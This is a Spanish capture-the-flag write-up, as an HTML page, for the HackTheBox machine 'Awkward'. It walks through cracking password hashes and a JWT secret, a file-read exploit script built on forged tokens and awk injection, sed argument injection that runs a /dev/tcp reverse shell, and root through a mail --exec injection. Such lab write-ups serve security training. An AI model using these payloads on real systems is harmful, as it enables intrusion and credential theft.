@@ -1,0 +1,462 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Awkward HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/awkward.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Awkward HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Awkward de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Awkward de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Awkward HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Awkward HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Awkward de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Awkward HackTheBox</h1>
+          <p>Resolución de la máquina Awkward de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.185
+Nmap scan report for 10.10.11.185
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Con curl podemos ver que nos redirige a el dominio hat-valley.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">10.10.11.185
+&lt!DOCTYPE html>
+&lthtml>
+&lthead>
+&ltmeta http-equiv="Refresh" content="0; url='</span><span class="kd">http://hat-valley.htb</span><span class="p">'" />
+&lt/head>
+&ltbody>
+&lt/body>
+&lt/html></span>
+</code></pre></div></div>
+
+<div><p>En el codigo fuente podemos ver que llama a un app.js</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Desde curl, aplicando expresiones regulares podemos encontrar algunas rutas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s http://hat-valley.htb/js/app.js |</span><span class="s2"> grep</span><span class="p"> routes |</span><span class="s2"> sed</span><span class="no"> 's/path:/\n/g'</span><span class="p"> |</span><span class="s2"> grep </span><span class="no">'\ \\"\/'</span><span class="p"> |</span><span class="s2"> awk</span><span class="no"> '{print $2}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p"> |</span><span class="s2"> tr</span><span class="p"> -d \\
+/
+/hr
+/dashboard
+/leave</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver /hr desde el navegador y encontramos un login</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Seguimos aplicando regex en el archivo js, encontramos algunas rutas para la api</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s http://hat-valley.htb/js/app.js |</span><span class="s2"> sed</span><span class="no"> 's/baseURL + /\n/g' </span><span class="p">|</span><span class="s2"> grep</span><span class="no"> "return response" </span><span class="p">|</span><span class="s2"> awk </span><span class="no">'{print $2}'</span><span class="p"> FS=</span><span class="no">"'"</span><span class="p"> 
+all-leave
+submit-leave
+login
+staff-details
+store-status</span>
+</code></pre></div></div>
+
+<div><p>staff-details parece interesante, al darle un vistazo podemos ver hashes y usuarios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s http://hat-valley.htb/api/staff-details | </span><span class="s2">jq</span><span class="p">
+[
+  {
+    </span><span class="na">"user_id"</span><span class="p">: 1,
+    </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "christine.wool"</span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">:</span><span class="s2"> "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"</span><span class="p">,
+    </span><span class="na">"fullname"</span><span class="p">:</span><span class="s2"> "Christine Wool"</span><span class="p">,
+    </span><span class="na">"role"</span><span class="p">:</span><span class="s2"> "Founder, CEO"</span><span class="p">,
+    </span><span class="na">"phone"</span><span class="p">:</span><span class="s2"> "0415202922"</span><span class="p">
+  },
+  {
+    </span><span class="na">"user_id"</span><span class="p">: 2,
+    </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "christopher.jones"</span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">:</span><span class="s2"> "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"</span><span class="p">,
+    </span><span class="na">"fullname"</span><span class="p">:</span><span class="s2"> "Christopher Jones"</span><span class="p">,
+    </span><span class="na">"role"</span><span class="p">:</span><span class="s2"> "Salesperson"</span><span class="p">,
+    </span><span class="na">"phone"</span><span class="p">:</span><span class="s2"> "0456980001"</span><span class="p">
+  },
+  {
+    </span><span class="na">"user_id"</span><span class="p">: 3,
+    </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "jackson.lightheart"</span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">:</span><span class="s2"> "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"</span><span class="p">,
+    </span><span class="na">"fullname"</span><span class="p">:</span><span class="s2"> "Jackson Lightheart"</span><span class="p">,
+    </span><span class="na">"role"</span><span class="p">:</span><span class="s2"> "Salesperson"</span><span class="p">,
+    </span><span class="na">"phone"</span><span class="p">:</span><span class="s2"> "0419444111"</span><span class="p">
+  },
+  {
+    </span><span class="na">"user_id"</span><span class="p">: 4,
+    </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "bean.hill"</span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">:</span><span class="s2"> "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"</span><span class="p">,
+    </span><span class="na">"fullname"</span><span class="p">:</span><span class="s2"> "Bean Hill"</span><span class="p">,
+    </span><span class="na">"role"</span><span class="p">:</span><span class="s2"> "System Administrator"</span><span class="p">,
+    </span><span class="na">"phone"</span><span class="p">:</span><span class="s2"> "0432339177"</span><span class="p">
+  }
+]</span>
+</code></pre></div></div>
+
+<div><p>Aplicamos fuerza bruta y conseguimos la contraseña de christopher.jones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hashes
+christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
+christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
+jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
+bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-SHA256
+Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 XOP 4x2])
+</span><span class="kd">chris123         </span><span class="p">(</span><span class="na">christopher.jones</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Podemos iniciar sesión en /hr con las credenciales que conseguimos</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>En el dashboard hay un botón refresh que aparentemente no hace nada</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Al interceptar con burpsuite podemos ver que apunta a un recurso con el parametro url</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Podemos aprovecharnos de un SSRF para apuntar a puertos locales y fuzzearlos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ seq </span><span class="p">1 10000 > ports
+
+</span><span class="s2">❯ wfuzz</span><span class="p"> -c -w ./ports -u</span><span class="no"> 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"' </span><span class="p">-t 200 --hh 0
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"
+Total requests: 10000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000080:   </span><span class="s2">200</span><span class="p">        8 L      13 W       132 Ch      "80"
+000003002:   </span><span class="s2">200</span><span class="p">        685 L    5834 W     77002 Ch    "3002"
+000008080:   </span><span class="s2">200</span><span class="p">        54 L     163 W      2881 Ch     "8080"</span>
+</code></pre></div></div>
+
+<div><p>Vemos el puerto 3002 y al abrirlo con el SSRF podemos ver la documentación de la API</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Podemos ver que al hacer una petición a /all-leave ejecuta el comando awk con parámetros</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Aprovecharemos que usa la variable user, para incluir archivos locales de la siguiente manera</p></div>
+<div><p>La API ejecuta el siguiente comando:</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">awk '/" + </span><span class="na">user</span><span class="p"> + "/' /var/www/private/leave_requests.csv</span>
+</code></pre></div></div>
+
+<div><p>Si cambiamos en la cookie el usuario por /' /etc/passwd ' se ejecutaria:</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">awk '//' /etc/passwd ' /' /var/www/private/leave_requests.csv</span>
+</code></pre></div></div>
+
+<div><p>Para esto primero necesitamos el secreto para lo que podemos usar <a href="https://github.com/Sjord/jwtcrack">jwt2john.py</a></p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2ODk3NjUyfQ.ytZPNf2u7HNSns85xli9yZxIdbtpM_4Dq2wJ1J09fpU > hash
+
+</span><span class="s2">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 XOP 4x2])
+</span><span class="kd">123beany123</span><span class="p">      (?)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>En <a href="https://jwt.io/">jwt.io</a> podemos modificar el username de nuestra cookie por /' /etc/passwd '</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Nos genera la siguiente cookie, que podemos cambiar al hacer una peticion contra /api/all-leave</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NjY4OTc2NTJ9.GecJ1WIjoxgr5v4KmFV8xnx5QGKZnQMnjCQsGfWXlVA</span>
+</code></pre></div></div>
+
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Nos descarga un archivo all-leave el cual contiene el passwd como hemos definido</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">all-leave |</span><span class="s2"> grep </span><span class="p">sh$
+root:x:0:0:root:/root:/bin/bash
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash</span>
+</code></pre></div></div>
+
+<div><p>Para automatizar el cambiar la cookie por cada archivo podemos crear un script</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import</span><span class="p"> jwt, requests, sys
+
+</span><span class="kd">if</span><span class="k"> len</span><span class="p">(sys.argv)</span><span class="kd"> <</span><span class="na"> 2</span><span class="p">:
+   </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &ltarchivo>\n"</span><span class="p">)
+   </span><span class="k">print</span><span class="p">(</span><span class="s2">"[\033[1;34m*\033[1;37m] Para descargar archivos puede usar -d\n"</span><span class="p">)
+   exit(</span><span class="na">1</span><span class="p">)
+
+file </span><span class="kd">=</span><span class="p"> sys.argv[</span><span class="na">1</span><span class="p">]
+
+</span><span class="k">def </span><span class="na">generateJWT</span><span class="p">(</span><span class="no">file:</span><span class="p"> str) -> str:
+    payload </span><span class="kd">=</span><span class="p"> {</span><span class="s2"> "username"</span><span class="p">:</span><span class="s2"> "/'</span><span class="na"> {}</span><span class="s2"> '/"</span><span class="p">.format(</span><span class="no">file</span><span class="p">), </span><span class="s2">"iat"</span><span class="p">:</span><span class="na"> 1666898953 </span><span class="p">}
+    secret </span><span class="kd">=</span><span class="s2"> "123beany123"</span><span class="p">
+    token </span><span class="kd">=</span><span class="p"> jwt.encode(payload, secret)
+    </span><span class="kd">return</span><span class="p"> token
+
+token </span><span class="kd">=</span><span class="p"> generateJWT(file)
+target </span><span class="kd">=</span><span class="s2"> "http://hat-valley.htb/api/all-leave"</span><span class="p">
+cookies </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"token"</span><span class="p">:token}
+request </span><span class="kd">=</span><span class="p"> requests.get(target, </span><span class="no">cookies</span><span class="kd">=</span><span class="p">cookies)
+
+</span><span class="kd">try</span><span class="p">:
+    </span><span class="kd">if</span><span class="p"> sys.argv[</span><span class="na">2</span><span class="p">]</span><span class="kd"> == </span><span class="s2">'-d'</span><span class="p">:
+        </span><span class="kd">with</span><span class="k"> open</span><span class="p">(file.split(</span><span class="s2">"/"</span><span class="p">)[</span><span class="kd">-</span><span class="na">1</span><span class="p">].strip(),</span><span class="s2">'wb'</span><span class="p">)</span><span class="kd"> as</span><span class="p"> f:
+            f.write(request.content)
+
+</span><span class="kd">except</span><span class="p">:
+    </span><span class="kd">if</span><span class="p"> request.text </span><span class="kd">==</span><span class="s2"> "Failed to retrieve leave requests"</span><span class="p">:
+        </span><span class="k">print</span><span class="p">(</span><span class="s2">"\n[\033[1;31m-\033[1;37m] Archivo no encontrado\n"</span><span class="p">)
+        exit(</span><span class="na">1</span><span class="p">)
+    </span><span class="kd">else</span><span class="p">:
+        </span><span class="k">print</span><span class="p">(request.text.strip())</span>
+</code></pre></div></div>
+
+<div><p>Al ver el passwd podemos ver al usuario bean, asi que podemos probar leer su .bashrc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /home/bean/.bashrc |</span><span class="s2"> grep </span><span class="p">alias |</span><span class="s2"> grep </span><span class="p">-vE</span><span class="no"> "^\s|^$|^#"</span><span class="p">
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
+if [ -f ~/.bash_aliases ]; then</span>
+</code></pre></div></div>
+
+<div><p>Vemos un alias con una ruta a un script de bash, procedemos a darle un vistazo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /home/bean/Documents/backup_home.sh                   
+#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date > /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp</span>
+</code></pre></div></div>
+
+<div><p>Casi al final encontramos un archivo tar.gz, podemos descargarlo con -d</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /home/bean/Documents/backup/bean_backup_final.tar.gz -d
+
+</span><span class="s2">❯ ls</span><span class="p">
+</span><span class="kd"> bean_backup_final.tar.gz</span><span class="p">   exploit.py</span>
+</code></pre></div></div>
+
+<div><p>Descomprimimos un archivo y nos queda otro comprimido y un txt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ tar</span><span class="p"> -xf bean_backup_final.tar.gz &>/dev/null
+
+</span><span class="s2">❯ ls</span><span class="p">
+</span><span class="kd"> bean_backup.tar.gz</span><span class="p">   bean_backup_final.tar.gz   time.txt   exploit.py</span>
+</code></pre></div></div>
+
+<div><p>Descomprimimos el otro archivo .tar.gz y encontramos archivos tipicos de un home</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ tar</span><span class="p"> -xf bean_backup.tar.gz
+
+</span><span class="s2">❯ ls</span><span class="p">
+ Desktop   Downloads   Pictures   snap   Videos   Documents
+ Music   Public   Templates   bean_backup_final.tar.gz
+ bean_backup.tar.gz   time.txt   exploit.py</span>
+</code></pre></div></div>
+
+<div><p>Dentro de un archivo en .config podemos encontrar credenciales de bean.hill</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">.config/xpad/content-DS1ZS1
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity > 1
+- Implement checkout system
+
+</span><span class="na">bean.hill</span><span class="kd">
+014mrbeanrules!#P</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar por ssh y leer la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> bean@10.10.11.185
+bean@10.10.11.185's password: </span><span class="kd">014mrbeanrules!#P
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(bean) gid=1001(bean) groups=1001(bean)
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.185 dead:beef::250:56ff:feb9:4420 
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+c47**************************134
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Además del dominio hat-valley.htb también podemos buscar subdominios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u hat-valley.htb -t 200
+===============================================================
+[+] Url:          http://hat-valley.htb
+[+] Threads:      200
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">store.hat-valley.htb</span><span class="p"> (Status: 401) [Size: 188]</span>
+</code></pre></div></div>
+
+<div><p>Al intentar entrar nos pide credenciales, por suerte la contraseña de bean funciona para admin</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>Leyendo archivos php de store, encontramos que ejecuta sed y unos argumentos que podemos explotar ya que el item_id es algo que podemos controlar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store</span><span class="p">$ cat cart_actions.php  | grep sed
+        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store$</span>
+</code></pre></div></div>
+
+<div><p>Para ello primero vamos a shop y agregamos cualquier cosa al carrito de compras</p></div>
+<div><p><img src="./11.png"><p></div>
+
+<div><p>En el directorio cart de la web se creara un nuevo archivo que contiene la data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ ls
+c4ff-1de5-810-ca97
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ cat c4ff-1de5-810-ca97
+***Hat Valley Cart***
+item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Primero vamos a crear un archivo rev.sh en /tmp que nos haga una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ cat rev.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.10/443 0>&1
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ chmod +x rev.sh
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Necesitamos modificar el archivo que se creo, pero no tenemos permiso asi que le hacemos una copia, lo borramos y renombramos la copia</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ cp c4ff-1de5-810-ca97 bak
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ rm -f c4ff-1de5-810-ca97 
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ cp bak c4ff-1de5-810-ca97
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora lo modificamos para que el sed nos ejecute la revshell, quedaria asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$ cat c4ff-1de5-810-ca97 
+***Hat Valley Cart***
+item_id=1' -e "1e /tmp/rev.sh" /tmp/rev.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+</span><span class="s2">bean@awkward</span><span class="p">:</span><span class="na">/var/www/store/cart</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En la web vamos a el carrito y eliminamos el item pero lo interceptamos con burpsuite</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>Agregamos a la petición lo mismo que al archivo pero convertimos el espacio a +</p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><p>Al dar a forward, se ejecuta el script y recibimos la shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.185
+</span><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/store</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/store</span><span class="p">$ hostname -I
+10.10.11.185 dead:beef::250:56ff:feb9:8ab1 
+</span><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/store</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En /var/www/private podemos ver algo que parecen ser argumentos de mail</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/private</span><span class="p">$ cat leave_requests.csv 
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+</span><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/private</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con <a href="https://github.com/DominicBreuker/pspy">pspy </a>podemos ver que root ejecuta algunos de ellos<div><p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">CMD: UID=0    PID=7481   | mail -s Leave Request: bean.hill christine</span>
+</code></pre></div></div>
+
+<div><p><a href="https://gtfobins.github.io/gtfobins/mail/">Gtfobins</a> nos da una via de ejecutar scripts o binarios con mail</p></div>
+<div><p>Aprovechando el rev.sh que tenemos en /tmp agregaremos una linea que lo ejecute al archivo mail</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/private</span><span class="p">$ echo '" --exec="\!/tmp/rev.sh"' >> leave_requests.csv
+</span><span class="s2">www-data@awkward</span><span class="p">:</span><span class="na">~/private</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Despues de unos segundos podemos ver como se ejecuta y nos llega la shell como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">CMD: UID=0    PID=7578   | mail -s Leave Request: " --exec="\!/tmp/rev.sh" christine
+CMD: UID=0    PID=7582   | /bin/bash /tmp/rev.sh</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.185
+</span><span class="s2">root@awkward</span><span class="p">:</span><span class="na">~/scripts</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@awkward</span><span class="p">:</span><span class="na">~/scripts</span><span class="p"># hostname -I
+10.10.11.185 dead:beef::250:56ff:feb9:8ab1 
+</span><span class="s2">root@awkward</span><span class="p">:</span><span class="na">~/scripts</span><span class="p"># cat /root/root.txt 
+bf3**************************397
+</span><span class="s2">root@awkward</span><span class="p">:</span><span class="na">~/scripts</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
